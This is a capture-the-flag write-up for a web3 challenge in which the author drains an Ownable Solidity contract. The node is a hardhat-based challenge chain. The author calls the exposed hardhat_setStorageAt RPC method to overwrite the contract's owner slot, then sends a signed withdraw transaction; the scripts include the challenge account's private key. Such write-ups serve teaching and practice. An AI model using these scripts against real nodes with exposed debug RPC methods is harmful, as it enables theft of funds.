# Blockchain in dev - web3

## Contracts

### Challenge

We get one challenge contract, and want to get all value of it out of the contract. We also receive a address (including private key) on the chain which we can use to sign transactions.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.1;

import "@openzeppelin/contracts/access/Ownable.sol";

contract Challenge is Ownable{

	constructor() payable {
        require(msg.value == 100 ether,"100ETH required for the start the challenge");
	}

    function withdraw(address payable beneficiary) public onlyOwner {
        beneficiary.transfer(address(this).balance);
    }
}
```

We also get the setup contract, as well as it's address.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.1;
import "./Challenge.sol";

contract Setup {
	Challenge public chall;

	constructor() payable {
		require(msg.value >= 100, "Not enough ETH to create the challenge..");
		chall = (new Challenge){ value: 50 ether }();
	}

	function isSolved() public view returns (bool) {
		return address(chall).balance == 0;
	}
}

```

The challenge description mentions that the blockchain was deployed using hardhat.


## Solution

First we want to get the address where our challenge contract was deployed. This can be done by retrieiving storage(0) of the setup contract.

```js
const Web3 = require('web3');

// create a new instance of the web3 object
const web3 = new Web3('https://blockchainindev.insomnihack.ch:32889');

// set the address of the contract
const contractAddress = '0x444A7432CCb1F393Ac6c5642298F403E32128F0a';

// call the getStorageAt() function to retrieve the value stored at index 0
web3.eth.getStorageAt(contractAddress, 0, (error, result) => {
  if (error) {
    console.error(error);
  } else {
    console.log('Challenge:', result);
  }
});
```

Then it's also helpful if we can check for what the owner of the challenge currently is to be able to debug.

```js
const Web3 = require('web3');

// create a new instance of the web3 object
const web3 = new Web3('https://blockchainindev.insomnihack.ch:32915');

// set the address of the contract
const contractAddress = '0xbd3333aa8b94e3eb97cdf6638676bbbfcfdb9bc6';

// call the getStorageAt() function to retrieve the value stored at index 0
web3.eth.getStorageAt(contractAddress, 0, (error, result) => {
  if (error) {
    console.error(error);
  } else {
    console.log('Owner:', result);
  }
});
```

After some groundwork we can start exploiting. The idea I had, which also was the exploit in the end, was that we could leverage some hardhat functionality to change the blockchain data as we want. I used the setStorageAt() function to just overwrite the owner of the challenge contract, so we can easily drain it.

```js
const { ethers } = require('hardhat');

const provider = new ethers.providers.JsonRpcProvider('https://blockchainindev.insomnihack.ch:32915');

const toBytes32 = (bn) => {
  return ethers.utils.hexlify(ethers.utils.zeroPad(bn.toHexString(), 32));
};

const setStorageAt = async (address, index, value) => {
  await provider.send("hardhat_setStorageAt", [address, index, value]);
  await provider.send("evm_mine", []); // Just mines to the next block
};

(async () => {
  await setStorageAt(
    "0xbd3333aa8b94e3eb97cdf6638676bbbfcfdb9bc6",
    "0x0",
    "0x000000000000000000000000133756e1688E475c401d1569565e8E16E65B1337"
  );
})();
``` 

When we have overwritten the owner we can easily drain it. Script below:

```js
const Web3 = require('web3');
const abi = require('./abi.json');

const privateKey = '0xedbc6d1a8360d0c02d4063cdd0a23b55c469c90d3cfbc2c88a015f9dd92d22b3';
const account = '0x133756e1688E475c401d1569565e8E16E65B1337';
const contractAddress = '0xbd3333aa8b94e3eb97cdf6638676bbbfcfdb9bc6';
const recipientAddress = '0x133756e1688E475c401d1569565e8E16E65B1337';
const rpcUrl = 'https://blockchainindev.insomnihack.ch:32915';

const web3 = new Web3(rpcUrl);
const contract = new web3.eth.Contract(abi, contractAddress);

async function withdraw(recipient) {
  const nonce = await web3.eth.getTransactionCount(account);
  const gasPrice = await web3.eth.getGasPrice();

  const functionAbi = contract.methods.withdraw(recipient).encodeABI();

  const txParams = {
    to: contractAddress,
    data: functionAbi,
    gasPrice: gasPrice,
    gas: 100000, // Add the gas parameter with a value of your choice
    nonce: nonce
  };

  const signedTx = await web3.eth.accounts.signTransaction(txParams, privateKey);
  const txReceipt = await web3.eth.sendSignedTransaction(signedTx.rawTransaction);
  console.log(`Transaction Hash: ${txReceipt.transactionHash}`);
}

withdraw(recipientAddress);
```
--> Flag